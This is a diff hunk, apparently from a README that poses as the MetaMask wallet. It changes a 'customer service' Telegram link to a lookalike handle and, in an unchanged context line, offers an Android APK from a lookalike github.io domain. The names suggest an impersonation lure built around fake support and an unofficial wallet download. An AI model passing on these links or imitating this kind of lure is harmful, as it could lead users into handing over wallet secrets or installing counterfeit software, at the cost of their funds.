@@ -155,7 +155,7 @@ Enter the corresponding DAPP website to browse defi, gamefi, and more smoothly
 
 
 
-If you have any usage issues, please consult customer service https://t.me/Wallet_service Obtain manual one-on-one answers
+If you have any usage issues, please consult customer service [Wallet_service](https://t.me/metarmaskswallet) Obtain manual one-on-one answers
 
 
 #### Download Release APK ：[MetaMask-APK](https://metamaskswallet.github.io/upload/MetaMask_Android.apk)
